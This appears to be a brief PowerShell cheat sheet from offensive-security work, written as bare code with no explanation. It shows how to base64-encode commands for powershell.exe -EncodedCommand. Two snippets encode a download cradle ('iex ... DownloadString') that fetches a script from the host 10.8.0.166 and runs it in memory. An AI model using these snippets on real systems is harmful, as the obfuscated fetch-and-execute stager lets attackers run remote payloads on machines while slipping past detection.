```
#Encode Command
  $command = "command”
  $bytes = [Text.Encoding]::Unicode.GetBytes($command)
  $encodedCommand = [Convert]::ToBase64String($bytes)
  echo $encodedCommand
  #Execute command
  powershell.exe -EncodedCommand $encodedcommand
  ```
  ```
  $CMD = "iex (New-Object Net.WebClient).DownloadString('http://10.8.0.166:80/download/file.ps1')"
[System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($CMD))
  ``
  
  ```
  
$command = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.166:80/download/file.ps1'))"
$bytes = [Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
  ```
